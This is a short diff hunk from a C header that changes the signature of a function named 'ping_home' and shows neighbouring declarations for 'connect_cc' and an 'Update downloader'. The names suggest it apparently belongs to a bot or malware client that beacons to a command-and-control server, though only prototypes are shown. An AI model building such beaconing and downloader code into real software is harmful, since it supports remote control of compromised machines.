@@ -32,7 +32,7 @@ int connect_cc(char *ip_adrr, int port, int *socket_desc,
  * 
  * Returns - OK or ERROR
 */
-int ping_home(char *ip_addr, int port);
+int ping_home(int *socket_desc);
 
 /** 
  * Update downloader
